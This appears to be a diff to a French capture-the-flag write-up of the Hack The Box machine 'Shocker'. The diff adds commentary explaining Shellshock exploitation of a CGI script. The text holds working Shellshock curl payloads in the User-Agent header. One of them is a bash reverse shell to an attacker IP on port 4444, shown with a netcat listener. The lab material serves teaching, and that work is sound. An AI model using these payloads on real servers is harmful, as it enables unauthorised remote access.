@@ -389,7 +389,7 @@ Le site web exposé par la machine est extrêmement minimaliste : il ne présent
 
 ![Bug](bug.jpg)
 
-
+Conformément à ce que suggérait l’énumération, nous concentrons maintenant notre attention sur le répertoire `/cgi-bin/`, point d’entrée potentiel pour l’exploitation.
 
 
 ```bash
@@ -483,7 +483,9 @@ Port 80 (http)
                                                     
 ```
 
+La présence du script `user.sh` dans `/cgi-bin/` évoque immédiatement une possible **vulnérabilité Shellshock**. Nous allons donc vérifier si ce script est effectivement exploitable.
 
+- Nous commençons par injecter dans l’en-tête *User-Agent* une définition de fonction suivie d’une commande (`echo VULN`), conformément au mécanisme d’exploitation de Shellshock. Si le serveur exécute cette commande, cela confirme que le script CGI est vulnérable.
 
 ```bash
 curl -H 'User-Agent: () { :; }; echo; echo VULN' http://shocker.htb/cgi-bin/user.sh
@@ -495,7 +497,7 @@ Just an uptime test script
 
 ```
 
-
+- Pour renforcer la vérification, nous remplaçons la commande précédente par `/usr/bin/id`. L’exécution de cette commande permet de confirmer l’exploitation Shellshock et d’identifier le contexte utilisateur dans lequel le script CGI s’exécute.
 
 ```bash
 curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://shocker.htb/cgi-bin/user.sh 
@@ -510,7 +512,9 @@ curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.152/4
 
 ```
 
+- La vulnérabilité étant confirmée, nous injectons un payload Bash de reverse shell dans l’en-tête *User-Agent*. Celui-ci est exécuté via Shellshock et ouvre immédiatement une session distante sur notre Kali Linux.
 
+Dans un autre terminal de kali linux
 
 ```bash
 nc -lvnp 4444                                                       
